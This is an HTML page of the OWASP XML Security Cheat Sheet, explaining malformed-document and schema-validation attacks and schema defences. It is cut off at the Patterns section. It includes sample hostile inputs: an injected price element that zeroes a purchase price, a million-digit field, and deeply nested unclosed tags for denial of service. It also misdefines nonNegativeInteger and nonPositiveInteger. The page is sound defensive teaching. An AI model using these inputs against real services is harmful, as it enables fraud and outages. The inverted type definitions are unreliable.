<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  
  
  <link rel="shortcut icon" href="../../img/favicon.ico">
  <title>XML Security Cheat Sheet - OWASP Cheat Sheet Series</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700" />

  <link rel="stylesheet" href="../../css/theme.css" />
  <link rel="stylesheet" href="../../css/theme_extra.css" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css" />
  
  <script>
    // Current page data
    var mkdocs_page_name = "XML Security Cheat Sheet";
    var mkdocs_page_input_path = "cheatsheets/XML_Security_Cheat_Sheet.md";
    var mkdocs_page_url = null;
  </script>
  
  <script src="../../js/jquery-2.1.1.min.js" defer></script>
  <script src="../../js/modernizr-2.8.3.min.js" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
  <script>hljs.initHighlightingOnLoad();</script> 
  
</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
    <div class="wy-side-scroll">
      <div class="wy-side-nav-search">
        <a href="../.." class="icon icon-home"> OWASP Cheat Sheet Series</a>
        <div role="search">
  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
  </form>
</div>
      </div>

      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
                <ul>
                    <li class="toctree-l1"><a class="reference internal" href="../..">Home</a>
                    </li>
                </ul>
                <ul>
                    <li class="toctree-l1"><a class="reference internal" href="../../IndexASVS/">Index ASVS</a>
                    </li>
                </ul>
                <ul>
                    <li class="toctree-l1"><a class="reference internal" href="../../IndexProactiveControls/">Index Proactive Controls</a>
                    </li>
                </ul>
                <ul>
                    <li class="toctree-l1"><a class="reference internal" href="../../glossary/">Index Alphabetical</a>
                    </li>
                </ul>
                <p class="caption"><span class="caption-text">Cheatsheets</span></p>
                <ul class="current">
                    <li class="toctree-l1"><a class="reference internal" href="../AJAX_Security_Cheat_Sheet/">AJAX Security Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Abuse_Case_Cheat_Sheet/">Abuse Case Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Access_Control_Cheat_Sheet/">Access Control Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Attack_Surface_Analysis_Cheat_Sheet/">Attack Surface Analysis Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Authentication_Cheat_Sheet/">Authentication Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Authorization_Testing_Automation/">Authorization Testing Automation</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Bean_Validation_Cheat_Sheet/">Bean Validation Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../C-Based_Toolchain_Hardening/">C-Based Toolchain Hardening</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../C-Based_Toolchain_Hardening_Cheat_Sheet/">C-Based Toolchain Hardening Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Choosing_and_Using_Security_Questions_Cheat_Sheet/">Choosing and Using Security Questions Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Clickjacking_Defense_Cheat_Sheet/">Clickjacking Defense Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Content_Security_Policy_Cheat_Sheet/">Content Security Policy Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Credential_Stuffing_Prevention_Cheat_Sheet/">Credential Stuffing Prevention Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Cross-Site_Request_Forgery_Prevention_Cheat_Sheet/">Cross-Site Request Forgery Prevention Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Cross_Site_Scripting_Prevention_Cheat_Sheet/">Cross Site Scripting Prevention Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Cryptographic_Storage_Cheat_Sheet/">Cryptographic Storage Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../DOM_based_XSS_Prevention_Cheat_Sheet/">DOM based XSS Prevention Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Database_Security_Cheat_Sheet/">Database Security Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Denial_of_Service_Cheat_Sheet/">Denial of Service Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Deserialization_Cheat_Sheet/">Deserialization Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Docker_Security_Cheat_Sheet/">Docker Security Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../DotNet_Security_Cheat_Sheet/">DotNet Security Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Error_Handling_Cheat_Sheet/">Error Handling Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../File_Upload_Cheat_Sheet/">File Upload Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Forgot_Password_Cheat_Sheet/">Forgot Password Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../HTML5_Security_Cheat_Sheet/">HTML5 Security Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../HTTP_Strict_Transport_Security_Cheat_Sheet/">HTTP Strict Transport Security Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Injection_Prevention_Cheat_Sheet/">Injection Prevention Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Injection_Prevention_Cheat_Sheet_in_Java/">Injection Prevention Cheat Sheet in Java</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Input_Validation_Cheat_Sheet/">Input Validation Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet/">Insecure Direct Object Reference Prevention Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../JAAS_Cheat_Sheet/">JAAS Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../JSON_Web_Token_Cheat_Sheet_for_Java/">JSON Web Token Cheat Sheet for Java</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Key_Management_Cheat_Sheet/">Key Management Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../LDAP_Injection_Prevention_Cheat_Sheet/">LDAP Injection Prevention Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Logging_Cheat_Sheet/">Logging Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Mass_Assignment_Cheat_Sheet/">Mass Assignment Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Microservices_based_Security_Arch_Doc_Cheat_Sheet/">Microservices based Security Arch Doc Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Multifactor_Authentication_Cheat_Sheet/">Multifactor Authentication Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Nodejs_security_cheat_sheet/">Nodejs security cheat sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../OS_Command_Injection_Defense_Cheat_Sheet/">OS Command Injection Defense Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../PHP_Configuration_Cheat_Sheet/">PHP Configuration Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Password_Storage_Cheat_Sheet/">Password Storage Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Pinning_Cheat_Sheet/">Pinning Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Query_Parameterization_Cheat_Sheet/">Query Parameterization Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../REST_Assessment_Cheat_Sheet/">REST Assessment Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../REST_Security_Cheat_Sheet/">REST Security Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Ruby_on_Rails_Cheatsheet/">Ruby on Rails Cheatsheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../SAML_Security_Cheat_Sheet/">SAML Security Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../SQL_Injection_Prevention_Cheat_Sheet/">SQL Injection Prevention Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Securing_Cascading_Style_Sheets_Cheat_Sheet/">Securing Cascading Style Sheets Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Server_Side_Request_Forgery_Prevention_Cheat_Sheet/">Server Side Request Forgery Prevention Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Session_Management_Cheat_Sheet/">Session Management Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../TLS_Cipher_String_Cheat_Sheet/">TLS Cipher String Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Third_Party_Javascript_Management_Cheat_Sheet/">Third Party Javascript Management Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Threat_Modeling_Cheat_Sheet/">Threat Modeling Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Transaction_Authorization_Cheat_Sheet/">Transaction Authorization Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Transport_Layer_Protection_Cheat_Sheet/">Transport Layer Protection Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Unvalidated_Redirects_and_Forwards_Cheat_Sheet/">Unvalidated Redirects and Forwards Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../User_Privacy_Protection_Cheat_Sheet/">User Privacy Protection Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Virtual_Patching_Cheat_Sheet/">Virtual Patching Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Vulnerability_Disclosure_Cheat_Sheet/">Vulnerability Disclosure Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Vulnerable_Dependency_Management_Cheat_Sheet/">Vulnerable Dependency Management Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../Web_Service_Security_Cheat_Sheet/">Web Service Security Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../XML_External_Entity_Prevention_Cheat_Sheet/">XML External Entity Prevention Cheat Sheet</a>
                    </li>
                    <li class="toctree-l1 current"><a class="reference internal current" href="./">XML Security Cheat Sheet</a>
    <ul class="current">
    </ul>
                    </li>
                </ul>
      </div>
    </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
        <a href="../..">OWASP Cheat Sheet Series</a>
      </nav>

      
      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="../..">Docs</a> &raquo;</li>
    
      
        
          <li>Cheatsheets &raquo;</li>
        
      
    
    <li>XML Security Cheat Sheet</li>
    <li class="wy-breadcrumbs-aside">
      
    </li>
  </ul>
  
  <hr/>
</div>
          <div role="main">
            <div class="section">
              
                <h1 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h1>
<p>Specifications for XML and XML schemas include multiple security flaws. At the same time, these specifications provide the tools required to protect XML applications. Even though we use XML schemas to define the security of XML documents, they can be used to perform a variety of attacks: file retrieval, server side request forgery, port scanning, or brute forcing. This cheat sheet exposes how to exploit the different possibilities in libraries and software divided in two sections:</p>
<ul>
<li><strong>Malformed XML Documents</strong>: vulnerabilities using not well formed documents.</li>
<li><strong>Invalid XML Documents</strong>: vulnerabilities using documents that do not have the expected structure.</li>
</ul>
<h1 id="malformed-xml-documents">Malformed XML Documents<a class="headerlink" href="#malformed-xml-documents" title="Permanent link">&para;</a></h1>
<p>The W3C XML specification defines a set of principles that XML documents must follow to be considered well formed. When a document violates any of these principles, it must be considered a fatal error and the data it contains is considered malformed. Multiple tactics will cause a malformed document: removing an ending tag, rearranging the order of elements into a nonsensical structure, introducing forbidden characters, and so on. The XML parser should stop execution once detecting a fatal error. The document should not undergo any additional processing, and the application should display an error message.</p>
<p>The recommendation to avoid these vulnerabilities are to use an XML processor that follows W3C specifications and does not take significant additional time to process malformed documents. In addition, use only well-formed documents and validate the contents of each element and attribute to process only valid values within predefined boundaries.</p>
<h2 id="more-time-required">More Time Required<a class="headerlink" href="#more-time-required" title="Permanent link">&para;</a></h2>
<p>A malformed document may affect the consumption of Central Processing Unit (CPU) resources. In certain scenarios, the amount of time required to process malformed documents may be greater than that required for well-formed documents. When this happens, an attacker may exploit an asymmetric resource consumption attack to take advantage of the greater processing time to cause a Denial of Service (DoS).</p>
<p>To analyze the likelihood of this attack, analyze the time taken by a regular XML document vs the time taken by a malformed version of that same document. Then, consider how an attacker could use this vulnerability in conjunction with an XML flood attack using multiple documents to amplify the effect.</p>
<h2 id="applications-processing-malformed-data">Applications Processing Malformed Data<a class="headerlink" href="#applications-processing-malformed-data" title="Permanent link">&para;</a></h2>
<p>Certain XML parsers have the ability to recover malformed documents. They can be instructed to try their best to return a valid tree with all the content that they can manage to parse, regardless of the document's noncompliance with the specifications. Since there are no predefined rules for the recovery process, the approach and results may not always be the same. Using malformed documents might lead to unexpected issues related to data integrity.</p>
<p>The following two scenarios illustrate attack vectors a parser will analyze in recovery mode:</p>
<h3 id="malformed-document-to-malformed-document">Malformed Document to Malformed Document<a class="headerlink" href="#malformed-document-to-malformed-document" title="Permanent link">&para;</a></h3>
<p>According to the XML specification, the string <code>--</code> (double-hyphen) must not occur within comments. Using the recovery mode of lxml and PHP, the following document will remain the same after being recovered:</p>
<pre><code class="xml">&lt;element&gt;
 &lt;!-- one
  &lt;!-- another comment
 comment --&gt;
&lt;/element&gt;
</code></pre>

<h3 id="well-formed-document-to-well-formed-document-normalized">Well-Formed Document to Well-Formed Document Normalized<a class="headerlink" href="#well-formed-document-to-well-formed-document-normalized" title="Permanent link">&para;</a></h3>
<p>Certain parsers may consider normalizing the contents of your <code>CDATA</code> sections. This means that they will update the special characters contained in the <code>CDATA</code> section to contain the safe versions of these characters even though is not required:</p>
<pre><code class="xml">&lt;element&gt;
 &lt;![CDATA[&lt;script&gt;a=1;&lt;/script&gt;]]&gt;
&lt;/element&gt;
</code></pre>

<p>Normalization of a <code>CDATA</code> section is not a common rule among parsers. Libxml could transform this document to its canonical version, but although well formed, its contents may be considered malformed depending on the situation:</p>
<pre><code class="xml">&lt;element&gt;
 &amp;lt;script&amp;gt;a=1;&amp;lt;/script&amp;gt;
&lt;/element&gt;
</code></pre>

<h2 id="coercive-parsing">Coercive Parsing<a class="headerlink" href="#coercive-parsing" title="Permanent link">&para;</a></h2>
<p>A coercive attack in XML involves parsing deeply nested XML documents without their corresponding ending tags. The idea is to make the victim use up -and eventually deplete- the machine's resources and cause a denial of service on the target. Reports of a DoS attack in Firefox 3.67 included the use of 30,000 open XML elements without their corresponding ending tags. Removing the closing tags simplified the attack since it requires only half of the size of a well-formed document to accomplish the same results. The number of tags being processed eventually caused a stack overflow. A simplified version of such a document would look like this:</p>
<pre><code class="xml">&lt;A1&gt;
 &lt;A2&gt; 
  &lt;A3&gt;
   ...
    &lt;A30000&gt;
</code></pre>

<h2 id="violation-of-xml-specification-rules">Violation of XML Specification Rules<a class="headerlink" href="#violation-of-xml-specification-rules" title="Permanent link">&para;</a></h2>
<p>Unexpected consequences may result from manipulating documents using parsers that do not follow W3C specifications. It may be possible to achieve crashes and/or code execution when the software does not properly verify how to handle incorrect XML structures. Feeding the software with fuzzed XML documents may expose this behavior.</p>
<h1 id="invalid-xml-documents">Invalid XML Documents<a class="headerlink" href="#invalid-xml-documents" title="Permanent link">&para;</a></h1>
<p>Attackers may introduce unexpected values in documents to take advantage of an application that does not verify whether the document contains a valid set of values. Schemas specify restrictions that help identify whether documents are valid. A valid document is well formed and complies with the restrictions of a schema, and more than one schema can be used to validate a document. These restrictions may appear in multiple files, either using a single schema language or relying on the strengths of the different schema languages.</p>
<p>The recommendation to avoid these vulnerabilities is that each XML document must have a precisely defined XML Schema (not <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>) with every piece of information properly restricted to avoid problems of improper data validation. Use a local copy or a known good repository instead of the schema reference supplied in the XML document. Also, perform an integrity check of the XML schema file being referenced, bearing in mind the possibility that the repository could be compromised. In cases where the XML documents are using remote schemas, configure servers to use only secure, encrypted communications to prevent attackers from eavesdropping on network traffic.</p>
<h2 id="document-without-schema">Document without Schema<a class="headerlink" href="#document-without-schema" title="Permanent link">&para;</a></h2>
<p>Consider a bookseller that uses a web service through a web interface to make transactions. The XML document for transactions is composed of two elements: an <code>id</code> value related to an item and a certain <code>price</code>. The user may only introduce a certain <code>id</code> value using the web interface:</p>
<pre><code class="xml">&lt;buy&gt;
 &lt;id&gt;123&lt;/id&gt;
 &lt;price&gt;10&lt;/price&gt;
&lt;/buy&gt;
</code></pre>

<p>If there is no control on the document's structure, the application could also process different well-formed messages with unintended consequences. The previous document could have contained additional tags to affect the behavior of the underlying application processing its contents:</p>
<pre><code class="xml">&lt;buy&gt;
 &lt;id&gt;123&lt;/id&gt;&lt;price&gt;0&lt;/price&gt;&lt;id&gt;&lt;/id&gt;
 &lt;price&gt;10&lt;/price&gt;
&lt;/buy&gt;
</code></pre>

<p>Notice again how the value 123 is supplied as an <code>id</code>, but now the document includes additional opening and closing tags. The attacker closed the <code>id</code> element and sets a bogus <code>price</code> element to the value 0. The final step to keep the structure well-formed is to add one empty <code>id</code> element. After this, the application adds the closing tag for <code>id</code> and set the <code>price</code> to 10. If the application processes only the first values provided for the id and the value without performing any type of control on the structure, it could benefit the attacker by providing the ability to buy a book without actually paying for it.</p>
<h2 id="unrestrictive-schema">Unrestrictive Schema<a class="headerlink" href="#unrestrictive-schema" title="Permanent link">&para;</a></h2>
<p>Certain schemas do not offer enough restrictions for the type of data that each element can receive. This is what normally happens when using <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>; it has a very limited set of possibilities compared to the type of restrictions that can be applied in XML documents. This could expose the application to undesired values within elements or attributes that would be easy to constrain when using other schema languages. In the following example, a person's <code>age</code> is validated against an inline <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> schema:</p>
<pre><code class="xml">&lt;!DOCTYPE person [
 &lt;!ELEMENT person (name, age)&gt;
 &lt;!ELEMENT name (#PCDATA)&gt;
 &lt;!ELEMENT age (#PCDATA)&gt;
]&gt;
&lt;person&gt;
 &lt;name&gt;John Doe&lt;/name&gt;
 &lt;age&gt;11111..(1.000.000digits)..11111&lt;/age&gt;
&lt;/person&gt;
</code></pre>

<p>The previous document contains an inline <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> with a root element named <code>person</code>. This element contains two elements in a specific order: <code>name</code> and then <code>age</code>. The element <code>name</code> is then defined to contain <code>PCDATA</code> as well as the element <code>age</code>. After this definition begins the well-formed and valid XML document. The element name contains an irrelevant value but the <code>age</code> element contains one million digits. Since there are no restrictions on the maximum size for the <code>age</code> element, this one-million-digit string could be sent to the server for this element. Typically this type of element should be restricted to contain no more than a certain amount of characters and constrained to a certain set of characters (for example, digits from 0 to 9, the + sign and the - sign). If not properly restricted, applications may handle potentially invalid values contained in documents. Since it is not possible to indicate specific restrictions (a maximum length for the element <code>name</code> or a valid range for the element <code>age</code>), this type of schema increases the risk of affecting the integrity and availability of resources.</p>
<h2 id="improper-data-validation">Improper Data Validation<a class="headerlink" href="#improper-data-validation" title="Permanent link">&para;</a></h2>
<p>When schemas are insecurely defined and do not provide strict rules, they may expose the application to diverse situations. The result of this could be the disclosure of internal errors or documents that hit the application's functionality with unexpected values.</p>
<h3 id="string-data-types">String Data Types<a class="headerlink" href="#string-data-types" title="Permanent link">&para;</a></h3>
<p>Provided you need to use a hexadecimal value, there is no point in defining this value as a string that will later be restricted to the specific 16 hexadecimal characters. To exemplify this scenario, when using XML encryption some values must be encoded using base64 . This is the schema definition of how these values should look:</p>
<pre><code class="xml">&lt;element name=&quot;CipherData&quot; type=&quot;xenc:CipherDataType&quot;/&gt;
 &lt;complexType name=&quot;CipherDataType&quot;&gt;
  &lt;choice&gt;
   &lt;element name=&quot;CipherValue&quot; type=&quot;base64Binary&quot;/&gt;
   &lt;element ref=&quot;xenc:CipherReference&quot;/&gt;
  &lt;/choice&gt;
 &lt;/complexType&gt;
</code></pre>

<p>The previous schema defines the element <code>CipherValue</code> as a base64 data type. As an example, the IBM WebSphere DataPower SOA Appliance allowed any type of characters within this element after a valid base64 value, and will consider it valid. The first portion of this data is properly checked as a base64 value, but the remaining characters could be anything else (including other sub-elements of the <code>CipherData</code> element). Restrictions are partially set for the element, which means that the information is probably tested using an application instead of the proposed sample schema.</p>
<h3 id="numeric-data-types">Numeric Data Types<a class="headerlink" href="#numeric-data-types" title="Permanent link">&para;</a></h3>
<p>Defining the correct data type for numbers can be more complex since there are more options than there are for strings.</p>
<h4 id="negative-and-positive-restrictions">Negative and Positive Restrictions<a class="headerlink" href="#negative-and-positive-restrictions" title="Permanent link">&para;</a></h4>
<p>XML Schema numeric data types can include different ranges of numbers. They could include:</p>
<ul>
<li><strong>negativeInteger</strong>: Only negative numbers</li>
<li><strong>nonNegativeInteger</strong>: Negative numbers and the zero value</li>
<li><strong>positiveInteger</strong>: Only positive numbers</li>
<li><strong>nonPositiveInteger</strong>: Positive numbers and the zero value</li>
</ul>
<p>The following sample document defines an <code>id</code> for a product, a <code>price</code>, and a <code>quantity</code> value that is under the control of an attacker:</p>
<pre><code class="xml">&lt;buy&gt;
 &lt;id&gt;1&lt;/id&gt;
 &lt;price&gt;10&lt;/price&gt;
 &lt;quantity&gt;1&lt;/quantity&gt;
&lt;/buy&gt;
</code></pre>

<p>To avoid repeating old errors, an XML schema may be defined to prevent processing the incorrect structure in cases where an attacker wants to introduce additional elements:</p>
<pre><code class="xml">&lt;xs:schema xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
 &lt;xs:element name=&quot;buy&quot;&gt;
  &lt;xs:complexType&gt;
   &lt;xs:sequence&gt;
    &lt;xs:element name=&quot;id&quot; type=&quot;xs:integer&quot;/&gt;
    &lt;xs:element name=&quot;price&quot; type=&quot;xs:decimal&quot;/&gt;
    &lt;xs:element name=&quot;quantity&quot; type=&quot;xs:integer&quot;/&gt;
   &lt;/xs:sequence&gt;
  &lt;/xs:complexType&gt;
 &lt;/xs:element&gt;
&lt;/xs:schema&gt;
</code></pre>

<p>Limiting that <code>quantity</code> to an integer data type will avoid any unexpected characters. Once the application receives the previous message, it may calculate the final price by doing <code>price*quantity</code>. However, since this data type may allow negative values, it might allow a negative result on the user's account if an attacker provides a negative number. What you probably want to see in here to avoid that logical vulnerability is positiveInteger instead of integer.</p>
<h4 id="divide-by-zero">Divide by Zero<a class="headerlink" href="#divide-by-zero" title="Permanent link">&para;</a></h4>
<p>Whenever using user controlled values as denominators in a division, developers should avoid allowing the number zero. In cases where the value zero is used for division in XSLT, the error <code>FOAR0001</code> will occur. Other applications may throw other exceptions and the program may crash. There are specific data types for XML schemas that specifically avoid using the zero value. For example, in cases where negative values and zero are not considered valid, the schema could specify the data type <code>positiveInteger</code> for the element.</p>
<pre><code class="xml">&lt;xs:element name=&quot;denominator&quot;&gt;
 &lt;xs:simpleType&gt;
  &lt;xs:restriction base=&quot;xs:positiveInteger&quot;/&gt;
 &lt;/xs:simpleType&gt;
&lt;/xs:element&gt;
</code></pre>

<p>The element <code>denominator</code> is now restricted to positive integers. This means that only values greater than zero will be considered valid. If you see any other type of restriction being used, you may trigger an error if the denominator is zero.</p>
<h4 id="special-values-infinity-and-not-a-number-nan">Special Values: Infinity and Not a Number (NaN)<a class="headerlink" href="#special-values-infinity-and-not-a-number-nan" title="Permanent link">&para;</a></h4>
<p>The data types <code>float</code> and <code>double</code> contain real numbers and some special values: <code>-Infinity</code> or <code>-INF</code>, <code>NaN</code>, and <code>+Infinity</code> or <code>INF</code>. These possibilities may be useful to express certain values, but they are sometimes misused. The problem is that they are commonly used to express only real numbers such as prices. This is a common error seen in other programming languages, not solely restricted to these technologies. Not considering the whole spectrum of possible values for a data type could make underlying applications fail. If the special values <code>Infinity</code> and <code>NaN</code> are not required and only real numbers are expected, the data type <code>decimal</code> is recommended:</p>
<pre><code class="xml">&lt;xs:schema xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
 &lt;xs:element name=&quot;buy&quot;&gt;
  &lt;xs:complexType&gt;
   &lt;xs:sequence&gt;
    &lt;xs:element name=&quot;id&quot; type=&quot;xs:integer&quot;/&gt;
    &lt;xs:element name=&quot;price&quot; type=&quot;xs:decimal&quot;/&gt;
    &lt;xs:element name=&quot;quantity&quot; type=&quot;xs:positiveInteger&quot;/&gt;
   &lt;/xs:sequence&gt;
  &lt;/xs:complexType&gt;
 &lt;/xs:element&gt;
&lt;/xs:schema&gt;
</code></pre>

<p>The price value will not trigger any errors when set at Infinity or NaN, because these values will not be valid. An attacker can exploit this issue if those values are allowed.</p>
<h3 id="general-data-restrictions">General Data Restrictions<a class="headerlink" href="#general-data-restrictions" title="Permanent link">&para;</a></h3>
<p>After selecting the appropriate data type, developers may apply additional restrictions. Sometimes only a certain subset of values within a data type will be considered valid:</p>
<h4 id="prefixed-values">Prefixed Values<a class="headerlink" href="#prefixed-values" title="Permanent link">&para;</a></h4>
<p>Certain types of values should only be restricted to specific sets: traffic lights will have only three types of colors, only 12 months are available, and so on. It is possible that the schema has these restrictions in place for each element or attribute. This is the most perfect whitelist scenario for an application: only specific values will be accepted. Such a constraint is called <code>enumeration</code> in XML schema. The following example restricts the contents of the element month to 12 possible values:</p>
<pre><code class="xml">&lt;xs:element name=&quot;month&quot;&gt;
 &lt;xs:simpleType&gt;
  &lt;xs:restriction base=&quot;xs:string&quot;&gt;
   &lt;xs:enumeration value=&quot;January&quot;/&gt;
   &lt;xs:enumeration value=&quot;February&quot;/&gt;
   &lt;xs:enumeration value=&quot;March&quot;/&gt;
   &lt;xs:enumeration value=&quot;April&quot;/&gt;
   &lt;xs:enumeration value=&quot;May&quot;/&gt;
   &lt;xs:enumeration value=&quot;June&quot;/&gt;
   &lt;xs:enumeration value=&quot;July&quot;/&gt;
   &lt;xs:enumeration value=&quot;August&quot;/&gt;
   &lt;xs:enumeration value=&quot;September&quot;/&gt;
   &lt;xs:enumeration value=&quot;October&quot;/&gt;
   &lt;xs:enumeration value=&quot;November&quot;/&gt;
   &lt;xs:enumeration value=&quot;December&quot;/&gt;
  &lt;/xs:restriction&gt;
 &lt;/xs:simpleType&gt;
&lt;/xs:element&gt;
</code></pre>

<p>By limiting the month element's value to any of the previous values, the application will not be manipulating random strings.</p>
<h4 id="ranges">Ranges<a class="headerlink" href="#ranges" title="Permanent link">&para;</a></h4>
<p>Software applications, databases, and programming languages normally store information within specific ranges. Whenever using an element or an attribute in locations where certain specific sizes matter (to avoid overflows or underflows), it would be logical to check whether the data length is considered valid. The following schema could constrain a name using a minimum and a maximum length to avoid unusual scenarios:</p>
<pre><code class="xml">&lt;xs:element name=&quot;name&quot;&gt;
 &lt;xs:simpleType&gt;
  &lt;xs:restriction base=&quot;xs:string&quot;&gt;
   &lt;xs:minLength value=&quot;3&quot;/&gt;
   &lt;xs:maxLength value=&quot;256&quot;/&gt;
  &lt;/xs:restriction&gt;
 &lt;/xs:simpleType&gt;
&lt;/xs:element&gt;
</code></pre>

<p>In cases where the possible values are restricted to a certain specific length (let's say 8), this value can be specified as follows to be valid:</p>
<pre><code class="xml">&lt;xs:element name=&quot;name&quot;&gt;
 &lt;xs:simpleType&gt;
  &lt;xs:restriction base=&quot;xs:string&quot;&gt;
   &lt;xs:length value=&quot;8&quot;/&gt;
  &lt;/xs:restriction&gt;
 &lt;/xs:simpleType&gt;
&lt;/xs:element&gt;
</code></pre>

<h4 id="patterns">Patterns<a class="headerlink" href="#patterns" title="Permanent link">&para;</a></h4>
<p>Certain elements or attributes may follow a specific syntax. You can add <code>pattern</code> restrictions when using XML schemas. When you want to ensure that the data complies with a specific pattern, you can create a specific definition for it. Social security numbers (SSN) may serve as a good example; they must use a specific set of characters, a specific length, and a specific <code>pattern</code>:</p>
